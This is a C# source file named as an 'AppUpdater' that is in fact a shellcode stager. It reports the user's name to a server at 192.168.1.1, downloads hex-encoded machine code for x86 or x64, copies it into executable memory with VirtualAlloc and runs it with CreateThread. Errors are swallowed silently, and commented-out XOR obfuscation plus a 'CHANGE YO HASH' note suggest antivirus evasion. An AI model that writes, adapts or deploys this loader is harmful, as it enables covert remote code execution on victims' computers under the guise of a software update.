//CHANGE YO HASH
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace AppUpdater
{
    public partial class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, IntPtr flAllocationType, IntPtr flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref IntPtr lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        static void Main(string[] args)
        {
            try
            {
                WebClient wc = new WebClient();
                //add webpage status check
                //https://stackoverflow.com/questions/1344221/how-can-i-generate-random-alphanumeric-strings-in-c

                /*To be added - Rough authentication
                Random random = new Random();
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";                
                string randomString = new string(Enumerable.Repeat(chars, 24).Select(s => s[random.Next(s.Length)]).ToArray());
                */

                string updateString = wc.DownloadString("http://192.168.1.1/api/updates.php?action=versioncheck&user=" + Environment.UserName);
                string binaryLoad = null;
                if (updateString.Contains("2.0.2"))
                {
                    if (IntPtr.Size == 4)
                    {
                        binaryLoad = wc.DownloadString("http://192.168.1.1/api/updates.php?action=update&arch=x86&user=" + Environment.UserName);
                    }
                    else if (IntPtr.Size == 8)
                    {
                        binaryLoad = wc.DownloadString("http://192.168.1.1/api/updates.php?action=update&arch=x64&user=" + Environment.UserName);
                    }
                    else
                    {
                        binaryLoad = wc.DownloadString("http://192.168.1.1/api/updates.php?error=true");
                        return;
                    }
                    //add webpage status check

                    string[] updateBinary = binaryLoad.Split('|');
                    string stringStep = updateBinary[1].Replace(" ", String.Empty);                    
                    byte[] binaryPatch = ToByteArray(stringStep);

                    try
                    {
                        IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)(binaryPatch.Length + 1), (IntPtr)0x1000, (IntPtr)0x40);
                        Marshal.Copy(binaryPatch, 0, funcAddr, binaryPatch.Length);

                        IntPtr hThread = IntPtr.Zero;
                        IntPtr threadId = IntPtr.Zero;
                        IntPtr pinfo = IntPtr.Zero;

                        hThread = CreateThread(IntPtr.Zero, (uint)binaryPatch.Length, funcAddr, pinfo, 0, ref threadId);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }
                    catch
                    {
                        //string log = "Something went wrong";
                        //System.IO.File.WriteAllText(@"C:\log.txt", log);
                    }
                }
            }
            catch
            { }
        }
        public static byte[] ToByteArray(String HexString)
        {
            int NumberChars = HexString.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(HexString.Substring(i, 2), 16);
            }
            return bytes;
        }

        //https://stackoverflow.com/questions/38816004/simple-string-encryption-without-dependencies
        /*
        public static string Scramble(string input)
        {
            //AM34
            byte xorConstant = 0x34;
           
            byte[] data = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(data[i] ^ xorConstant);
            }
            string output = Convert.ToBase64String(data);
            return output;
        }
        */
    }
}
